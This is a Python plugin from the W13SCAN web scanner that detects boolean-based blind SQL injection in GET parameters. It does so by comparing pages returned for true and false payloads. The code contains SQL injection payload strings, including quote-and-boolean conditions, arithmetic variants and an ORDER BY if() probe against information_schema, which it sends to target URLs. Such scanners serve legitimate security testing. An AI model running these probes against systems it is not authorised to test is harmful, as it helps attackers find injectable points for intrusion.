#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2019/6/30 4:19 PM
# @Author  : w8ay
# @File    : sql_inject_bool.py
import copy
import difflib
import os
import re

import requests

from W13SCAN.lib.common import random_str
from W13SCAN.lib.const import acceptedExt, ignoreParams, Level
from W13SCAN.lib.helper.diifpage import findDynamicContent, getFilteredPageContent
from W13SCAN.lib.output import out
from W13SCAN.lib.plugins import PluginBase


class W13SCAN(PluginBase):
    name = '基于布尔判断的SQL注入'
    desc = '''目前仅支持GET方式的请求'''
    level = Level.HIGHT

    def __init__(self):
        super().__init__()
        self.seqMatcher = difflib.SequenceMatcher(None)
        self.UPPER_RATIO_BOUND = 0.98
        self.LOWER_RATIO_BOUND = 0.02

        self.DIFF_TOLERANCE = 0.05
        self.CONSTANT_RATIO = 0.9

        self.retry = 6  # 重试次数
        self.dynamic = []

    def findDynamicContent(self, firstPage, secondPage):
        ret = findDynamicContent(firstPage, secondPage)
        if ret:
            self.dynamic.extend(ret)

    def removeDynamicContent(self, page):
        """
        Removing dynamic content from supplied page basing removal on
        precalculated dynamic markings
        """

        if page:
            for item in self.dynamic:
                prefix, suffix = item
                if prefix is None and suffix is None:
                    continue
                elif prefix is None:
                    page = re.sub(r"(?s)^.+%s" % re.escape(suffix), suffix.replace('\\', r'\\'), page)
                elif suffix is None:
                    page = re.sub(r"(?s)%s.+$" % re.escape(prefix), prefix.replace('\\', r'\\'), page)
                else:
                    page = re.sub(r"(?s)%s.+%s" % (re.escape(prefix), re.escape(suffix)),
                                  "%s%s" % (prefix.replace('\\', r'\\'), suffix.replace('\\', r'\\')), page)

        return page

    def inject(self, params, k, payload_false, payload_true):
        data = copy.deepcopy(params)
        is_inject = False

        data[k] = payload_false
        r2 = requests.get(self.netloc, params=data, headers=self.headers)
        falsePage = self.removeDynamicContent(r2.text)

        try:
            self.seqMatcher.set_seq1(self.resp_str)
            self.seqMatcher.set_seq2(falsePage)
            ratio_false = round(self.seqMatcher.quick_ratio(), 3)
            # ratio *= GetRatio(resp_str, html1)
            if ratio_false == 1.0:
                return False
        except (MemoryError, OverflowError):
            return False

        # true page

        data[k] = payload_true
        r = requests.get(self.netloc, params=data, headers=self.headers)
        truePage = self.removeDynamicContent(r.text)

        if truePage == falsePage:
            return False

        try:
            self.seqMatcher.set_seq1(self.resp_str or "")
            self.seqMatcher.set_seq2(truePage or "")
            ratio_true = round(self.seqMatcher.quick_ratio(), 3)
        except (MemoryError, OverflowError):
            return False

        if ratio_true > self.UPPER_RATIO_BOUND - 1 and (ratio_true - ratio_false) > self.DIFF_TOLERANCE:
            if ratio_false <= self.UPPER_RATIO_BOUND:
                is_inject = True
        if not is_inject and ratio_true > 0.68 and abs(ratio_true - ratio_false) > 0.05:
            originalSet = set(getFilteredPageContent(self.resp_str, True, "\n").split("\n"))
            trueSet = set(getFilteredPageContent(truePage, True, "\n").split("\n"))
            falseSet = set(getFilteredPageContent(falsePage, True, "\n").split("\n"))

            if len(originalSet - trueSet) <= 2 and trueSet != falseSet:
                candidates = trueSet - falseSet
                if len(candidates) > 0:
                    is_inject = True
                # if candidates:
                #     candidates = sorted(candidates, key=len)
                #     for candidate in candidates:
                #         if re.match(r"\A[\w.,! ]+\Z",
                #                     candidate) and ' ' in candidate and candidate.strip() and len(
                #             candidate) > 10:
                #             is_inject = True
                #             break

        if is_inject:
            infoMsg = "false_ratio:{} true_ratio:{} ".format(ratio_false, ratio_true)
            return {
                "requests": [r2.raw, r.raw],
                "info": infoMsg
            }
        else:
            return False

    def audit(self):
        method = self.requests.command  # 请求方式 GET or POST
        self.headers = headers = self.requests.get_headers()  # 请求头 dict类型
        url = self.build_url()  # 请求完整URL

        resp_data = self.response.get_body_data()  # 返回数据 byte类型
        self.resp_str = self.response.get_body_str()  # 返回数据 str类型 自动解码
        resp_headers = self.response.get_headers()  # 返回头 dict类型

        p = self.requests.urlparse
        params = self.requests.params
        self.netloc = self.requests.netloc

        if method == 'GET':
            # 从源码中获取更多链接
            if p.query == '':
                return
            exi = os.path.splitext(p.path)[1]
            if exi not in acceptedExt:
                return

            count = 0
            ratio = 0
            # 动态内容替换
            while ratio <= 0.98:
                if count > self.retry:
                    return
                r = requests.get(url, headers=headers)
                html = self.removeDynamicContent(r.text)
                self.resp_str = self.removeDynamicContent(self.resp_str)
                try:
                    self.seqMatcher.set_seq1(self.resp_str)
                    self.seqMatcher.set_seq2(html)
                    ratio = round(self.seqMatcher.quick_ratio(), 3)
                except MemoryError:
                    return
                self.findDynamicContent(self.resp_str, html)
                count += 1

            sql_flag = [
                "<--isdigit-->",
                "'&&'{0}'='{1}",
                '"&&"{0}"="{1}',
            ]

            for k, v in params.items():
                if k.lower() in ignoreParams:
                    continue
                temp_sql_flag = sql_flag.copy()
                # test order by
                if v == "desc" or v == "asc":
                    _sql_flag = ",if('{0}'='{1}',1,(select 1 from information_schema.tables))"
                    temp_sql_flag.append(_sql_flag)
            
                for flag in temp_sql_flag:
                    is_num = False
                    if flag == "<--isdigit-->":
                        if str(v).isdigit():
                            is_num = True
                        else:
                            continue
                    if is_num:
                        payload_false = "{}/0".format(v)
                    else:
                        payload_false = v + flag.format(random_str(1) + 'a', random_str(1) + 'b')

                    rand_str = random_str(2)
                    if is_num:
                        payload_true = "{}*1".format(v)
                    else:
                        payload_true = v + flag.format(rand_str, rand_str)

                    ret1 = self.inject(params, k, payload_false, payload_true)
                    if ret1:
                        if is_num:
                            payload_false = "{}^1".format(v)
                        else:
                            payload_false = v + flag.format(random_str(1) + 'c', random_str(1) + 'a')

                        rand_str = random_str(2)
                        if is_num:
                            payload_true = "{}^0".format(v)
                        else:
                            payload_true = v + flag.format(rand_str, rand_str)

                        ret2 = self.inject(params, k, payload_false, payload_true)
                        if ret2:
                            out.success(url, self.name, raw=ret2["requests"], payload_true=k + ":" + payload_true,
                                        payload_false=k + ":" + payload_false, infoMsg=ret2["info"])
                            return True
